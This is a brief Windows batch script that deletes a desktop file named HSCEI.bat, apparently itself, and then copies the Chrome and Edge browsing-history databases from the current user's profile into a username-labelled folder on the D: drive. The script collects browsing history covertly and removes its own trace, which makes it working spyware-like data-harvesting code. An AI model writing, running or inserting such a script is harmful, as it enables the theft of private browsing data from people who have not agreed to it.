@echo off
del C:/Users/%username%/Desktop/HSCEI.bat
D:
cd HistoryStorage
mkdir %username%
C:
cd %UserProfile%/AppData/Local/Google/Chrome/User Data/Default
copy "History" "D:"
D:
cd HistoryStorage
rename "History" "%username%chrome.db"
C:
cd "C:/Users/%username%/AppData/Local/Microsoft/Edge/User Data/Default"
copy "History" "D:"
D:
cd HistoryStorage
rename "History" "%username%edge.db"
move "*.db" "%username%"